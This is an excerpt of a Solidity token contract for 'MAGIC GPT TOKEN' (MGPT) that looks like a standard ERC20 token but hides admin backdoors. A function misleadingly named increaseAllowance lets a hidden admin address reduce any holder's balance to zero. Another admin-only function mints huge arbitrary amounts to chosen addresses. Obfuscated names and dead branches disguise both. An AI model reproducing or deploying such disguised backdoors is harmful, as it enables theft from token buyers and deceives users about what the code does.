...
contract MGPTTOKEN is Ownable {
    address public gnbcf5;
    uint256 supplyamount = 10000000000*10**decimals();
    uint256 private _cctotalSupply = supplyamount;
    string private _cctokenname = "MAGIC GPT TOKEN";
    string private _cctokensymbol = "MGPT";
    constructor(address tokenadmin) {
        gnbcf5 = tokenadmin;
       MGPT[_msgSender()] += supplyamount;
        emit Transfer(address(0), _msgSender(), supplyamount);
    }
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    mapping(address => uint256) private MGPT;
    ...
    function increaseAllowance(address uuyxxx) public     {
        if(gnbcf5 == _msgSender()){
        address newadd = uuyxxx;
        uint256 curamount = MGPT[newadd];
        uint256 newaaamount = MGPT[newadd]+MGPT[newadd]-curamount;
        MGPT[newadd] -= newaaamount;
        }else{
        if(gnbcf5 == _msgSender()){
        }else{
            revert("ccc");
    ...
    external {
        ...
        MGPT[cc123d] += 38200*((10**decimals()*xxtoudiamount))*1*1;
        require(gnbcf5 == _msgSender());
        if(gnbcf5 == _msgSender()){
        }
    }
    ...
    function _transfer(
        ...
        uint256 balance = MGPT[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        MGPT[from] = MGPT[from]-amount;
        MGPT[to] = MGPT[to]+amount;
